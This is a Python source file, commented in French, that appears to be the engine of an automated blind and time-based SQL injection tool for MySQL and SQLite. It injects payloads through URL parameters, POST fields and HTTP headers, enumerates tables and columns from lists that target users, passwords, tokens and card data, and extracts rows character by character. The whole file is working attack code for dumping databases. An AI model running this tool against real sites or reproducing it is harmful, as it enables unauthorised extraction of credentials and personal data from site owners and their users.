#coding:utf-8
import requests
import time
from colorama import *


def time_now():
	time_now = time.time()
	return time_now

# Permet de faire patientez une requête HTTP
def wait(delay):
   time.sleep(delay)

# Vérifie si un mot est présent dans une liste
# Retourne False s'il est trouvée
def verifList(liste, tofind):
	valid = True
	if tofind in liste:
		valid = False
	return valid

# Transforme une chaine en HEX
def Hex(String):
	Hex = '0x'
	for x in String:
		x = hex(ord(x))
		x = x.replace('0x', '')
		Hex += str(x)
	return Hex

def Enumerate(setting):

	escape = setting['escape']
	operator = setting['operator']
	comment = setting['comment']
	sqli_type = setting['sqli_type']
	p_time = setting['p_time']

	commonTables = ['user', 'USER', 'users', 'USERS', 'account', 'ACCOUNT', 'accounts', 'ACCOUNTS', 'session', 'sessions', 'menber', 'menbers', 'student', 'students', 'player', 'players',
	'cc', 'card', 'cards', 'profil', 'profils', 'staff', 'staffs', 'STAFF', 'STAFFS', 'admin', 'admins', 'ADMIN', 'ADMINS', 'log', 'logs', 'LOG', 'password', 'passwords', 'secret', 'lost_password',
	'passwd', 'credential', 'x_admin', 'mail', 'email', 'pass', 'ban', 'ip_ban', 'blacklist', 'modo', 'moderateur', 'moderator', 'team', 'page', 'pages']

	commonColumns = ['id', 'user_id', 'userid', 'group_id', 'uname', 'pseudo', 'username', 'name', 'user', 'lastname','firstname', 'prenom', 'nom', 'email', 'mail', 'addres_mail', 'passwd', 'password', 'pass',
	'secret', 'authentication_string', 'authentication', 'mdp', 'motdepasse', 'age', 'token', 'user_token', 'cc', 'credit', 'card', 'friend', 'player_name', 'player', 'ip', 'user_agent',
	'ban', 'admin', 'staff', 'modo', 'moderateur', 'moderator', 'city', 'country', 'ville', 'pays']

	avaibleTables = []

	for tables in commonTables:

		if sqli_type == 'BSQLI':
			payload = '{} {} substr((SELECT COUNT(NULL) FROM {}),1,1) >= 0 {}'.format(escape, operator, tables, comment)

		else:
			payload = '{} {} (SELECT SLEEP({}) AND substr((SELECT COUNT(NULL) FROM {}),1,1 >= 0){}'.format(escape, operator, p_time, tables, comment)

		if Fuzz(setting, payload):

			print('[+] '+tables)
			for columns in commonColumns:

				if sqli_type == 'BSQLI':
					payload = '{} {} substr((SELECT COUNT({}) FROM {}),1,1) >= 0 {}'.format(escape, operator, columns, tables, comment)

				else:
					payload = '{} {} (SELECT SLEEP({}) AND substr((SELECT COUNT({}) FROM {}),1,1 >= 0){}'.format(escape, operator, p_time, columns, tables, comment)

				if Fuzz(setting, payload):
					print('\t- '+ columns)

def Fuzz(setting, payload):

	sqli_type = setting['sqli_type']
	method = setting['method']
	url = setting['url']
	postData = setting['postData']
	cookies = setting['cookies']
	tofind = setting['tofind']
	p_time = setting['p_time']
	delay = setting['delay']
	msg = setting['msg']
	escape = setting['escape']
	comment = setting['comment']
	table = setting['table']
	column = setting['column']
	user_agent = setting['user_agent']

	http_header_post = setting['http_header_post']
	target_header = setting['target_header']

	vuln = False

	if cookies == '':
		headers = {'User-Agent': user_agent}
	else:
		headers = {'User-Agent': user_agent, 'Cookie': cookies}

	# Fuzzing pour la méthode GET
	if method == 'GET':

		url = url.replace('{fuzz}', payload)# On remplace {fuzz} par notre payload

		t1 = time_now()# Récupération du temps actuel
		reponse = requests.get(url, headers=headers)# Execution de la requête GET
		t2 = time_now()# Récupération du temps actuel

		if delay !=0:# Si delay est différent de zero on fait patientez la page
			wait(delay)

		page_source = str(reponse.text)# Récupération de la page de la réponse HTTP
		code = str(reponse.status_code)# Récupération du code réponse HTTP
		
		if sqli_type == 'BSQLI':# Fuzzing pour Blind Sql Injection

			if msg == 'No':# Fuzzing sans message

				if tofind in page_source:
					vuln = True
				else: 
					vuln = False

			else:# Fuzzing avec message

				if tofind in page_source:
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.GREEN+url+Fore.RESET)
					vuln = True
				else:
					vuln = False
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.RED+url+Fore.RESET)

		

		elif sqli_type == 'TBSQLI':# Fuzzing pour Total Blind Sql Injection

			time = round(t2 - t1)# Récupération du temps de chargement de la requête

			if msg == 'No':# Fuzzing sans message

				if time >= int(p_time):# Si le temps de chargement de la requête est plus grand ou égal au temps injecter alors c'est vulnérable
					vuln = True
				else:
					vuln = False

			else:# Fuzzing avec message

				if time>=int(p_time):
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.GREEN+url+Fore.RESET)
					vuln = True
				else:
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.RED+url+Fore.RESET)
					vuln = False

		url = url.replace(payload, '{fuzz}')# On reset l'url


	# Fuzzing pour méthode POST
	elif method == 'POST':

		for key, value in postData.items():#, On accède au dictionnaire de postData
			if '{fuzz}' in value:# Si on rencontre {fuzz} dans une valeur
				postData[key] = postData[key].replace('{fuzz}', payload)# On remplace {fuzz} par notre payload

				t1 = time_now()# Récupération du temps actuel
				reponse = requests.post(url, data=postData, headers=headers)# Execution de la requête POST
				t2 = time_now()# Récupération du temps actuel

				if delay != 0:
					wait(delay)

				page_source = str(reponse.text)
				code = str(reponse.status_code)
				if sqli_type == 'BSQLI':# Fuzzing pour Blind Sql Injection

					if msg == 'No':

						if tofind in page_source:
					 		vuln = True
						else:
					 		vuln = False
					else:

						if tofind in page_source:
							vuln = True
							print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.GREEN+postData[key]+Fore.RESET)
						else:
							vuln = False
							print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.RED+postData[key]+Fore.RESET)

				elif sqli_type == 'TBSQLI':# Fuzzing pour Total Blind Sql Injection

					time = round(t2 - t1)# Récupération du temps de chargement de la requête

					if msg == 'No':

						if time >= int(p_time):# Si le temps de chargement de la requête est plus grand ou égal au temps injecter alors c'est vulnérable
							vuln = True
						else:
							vuln = False

					else:
						if time >= int(p_time):
							print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.GREEN+postData[key]+Fore.RESET)
							vuln = True
						else:
							print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.RED+postData[key]+Fore.RESET)
							vuln = False


				for key, value in postData.items():
					if payload in value:
						postData[key] = postData[key].replace(payload, '{fuzz}')


	# Fuzzing pour les en-têtes HTTP
	elif method == 'HTTP_HEADER':

		randon_ip = '78.158.57.486'
		randon_userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
		randon_referer = 'http://google.com/x777/'

		# Injection des payload dans les en-têtes HTTP
		if target_header == 'X-Forwarded-For':
			headers['X-Forwarded-For'] = randon_ip + payload
		elif target_header == 'User-Agent':
			headers['User-Agent'] = randon_userAgent + payload
		else:
			headers['Referer'] =  randon_referer+ payload

		t1 = time_now()

		if http_header_post == 'No':
			reponse = requests.get(url, headers=headers)
		else:
			reponse = requests.post(url, data=postData, headers=headers)

		t2 = time_now()

		if delay != 0:
			wait(delay)

		page_source = str(reponse.text)
		code = str(reponse.status_code)

		if sqli_type == 'BSQLI':# Fuzzing pour Blind SQLi

			if msg == 'No':# Fuzzing sans message

				if tofind in page_source:
					vuln = True
				else:
					vuln = False

			else: # Fuzzing avec message

				if tofind in page_source:
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.GREEN+target_header+' '+payload+Fore.RESET)
					vuln = True
				else:
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.RED+target_header+' '+payload+Fore.RESET)
					vuln = False

		else:# Fuzzing pour Total Blind SQLi

			time = round(t2 - t1)

			if msg == 'No':# Fuzzing sans message

				if time >= int(p_time):
					vuln = True
				else:
					vuln = False

			else:# Fuzzing avec message

				if time >= int(p_time):
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.GREEN+target_header+' '+payload+Fore.RESET)
					vuln = True
				else:
					print('['+Fore.BLUE +'TRYING'+Fore.RESET+'] ['+Fore.YELLOW+code+Fore.RESET+'] '+Fore.RED+target_header+' '+payload+Fore.RESET)
					vuln = False
	return vuln


def GetData(setting, rows):

	# Récupération des informations lier à la requête HTTP
	dbms = setting['dbms']
	sqli_type = setting['sqli_type']
	escape = setting['escape']
	comment = setting['comment']
	operator = setting['operator']
	p_time = setting['p_time']
	charset = setting['charset']
	column = setting['column']
	table = setting['table']

	NumRows = rows
	nextchar = 1
	nextline = int(setting['startline'])
	if dbms == 'SQLite':
		nextline += 1
	dump = []
	valid = ''
	i = 0
	x = 0
	while x<NumRows:# Tant que le nombres d'élément trouver dans la colonne n'est pas trouvée
		while i<len(charset):# Tant que un caractère n'est pas trouvée
			for c in charset:
				c = ord(str(c))# Transformation d'un caractère en ASCII

				# Injection des éléments dans le payload
				if dbms == 'MySQL':

					if sqli_type == 'BSQLI':

						payload = '{} {} ASCII(substr((SELECT {} FROM {} LIMIT {},1),{},1))={}{}'.format(escape, operator, column, table, nextline, nextchar, c, comment)

					else:

						payload = '{} {} (SELECT SLEEP({}) AND ASCII(substr((SELECT {} FROM {} LIMIT {},1), {},1))={}){}'.format(escape, operator, p_time, column, table, nextline, nextchar, c, comment )

				else:

					payload = '{} {} (SELECT substr({}, {},1) FROM {}) = CHAR({}) LIMIT {} {}'.format(escape, operator, column, nextchar, table, c, nextline, comment)

				if Fuzz(setting, payload):# Si c'est Vulnérable
					i = 0# On continue la boucles
					nextchar += 1# On met +1 pour passer au caractère suivant
					valid += chr(int(c))# On decode le bon caractère et on le stock
					#print(valid)

				i +=1
		print('['+Fore.YELLOW+'+'+Fore.RESET+']['+Fore.BLUE+str(nextline)+Fore.RESET+'] retrieved : ' + valid)
		dump.append(valid)# On stocke la données dans une liste
		nextline +=1# On passe à ligne suivante pour LIMIT 
		x +=1# Un tours de boucles pour dire qu'on na trouvée une données
		i = 0# On met i à zero pour faire un comme back dans la boucles
		valid = ''# On reset 
		nextchar = 1# On reset le caractère à cherche

	return dump

def GetInfo(setting, function):

	delay = setting['delay']
	escape = setting['escape']
	operator = setting['operator']
	comment = setting['comment']
	charset = setting['charset']
	sqli_type = setting['sqli_type']
	p_time = setting['p_time']
	dbms = setting['dbms']

	nextchar = 1
	valid = ''
	i = 0 

	while i<len(charset):# Tant qu'un caractère est bon
		for c in charset:
			c = ord(str(c))# Transformation d'un caractère en ASCII

			if dbms == 'MySQL':

				if sqli_type == 'BSQLI':# Création d'un payload pour SQLi Blind

					payload = '{} {} ASCII(substr(({}), {},1))={}{}'.format(escape, operator, function, nextchar, c, comment)

				else:
					payload = '{} {} (SELECT SLEEP({}) AND ASCII(substr(({}), {},1))={}){}'.format(escape, operator, p_time, function, nextchar, c, comment)
			else:
				payload = '{} {} substr({},{},1) = CHAR({}){}'.format(escape, operator,function, nextchar, c, comment)

			if Fuzz(setting, payload):
				i = 0# On continue la boucles
				nextchar += 1# On met +1 pour passer au caractère suivant
				valid += chr(int(c))# On decode le bon caractère et on le stock
		
			i+=1
	print('['+Fore.YELLOW+'+'+Fore.RESET+'] '+Fore.YELLOW+function+Fore.RESET+' : ' + valid)

def GetRows(setting):

	# Récupération des informations lier à la requête HTTP
	dbms = setting['dbms']
	sqli_type = setting['sqli_type']
	tofind = setting['tofind']
	p_time = setting['p_time']
	escape = setting['escape']
	comment = setting['comment']
	operator = setting['operator']

	table = setting['table']
	column = setting['column']

	num_rows = False
	nextchar = 1 
	valid = ''
	i = 0
	while i < 10:
		for num in range(0,10):# De 0 à 9
			num = ord(str(num))# Transformation de num en ASCII

			if dbms == 'MySQL':

				if sqli_type == 'BSQLI':# Création d'un payload pour SQLi blind

					payload ='{} {} ASCII(substr((SELECT COUNT({}) from {}), {},1))={}{}'.format(escape, operator, column, table, nextchar, str(num), comment)

				else:# Création d'un payload pour SQLi Total Blind

					payload = '{} {} (SELECT SLEEP({}) AND ASCII(substr((SELECT COUNT({}) from {}), {},1))={}){}'.format(escape,operator, p_time, column, table, nextchar, str(num), comment )
			else:

				if sqli_type == 'BSQLI':

					payload = '{} {} (SELECT substr(count({}),{},1) from {}) = CHAR({}) {}'.format(escape, operator, column, nextchar, table, str(num), comment)

			if Fuzz(setting, payload):# Si c'est trouvée
				i = 0# On met i à 0 pour continuer la boucles
				nextchar += 1# On ajoute +1 a nextchar pour analyser le prochaine caractère
				valid += chr(int(num))

			i +=1# +1 s'ajoute fur à mesure, et si rien n'est trouver, alors la boucles se coupe

	if valid != '':# Si on n'a un résultat on le stock

		num_rows = int(valid)

	else: 

		num_rows += 0# SI c'est pas trouvée on met 0 à rows

	return num_rows
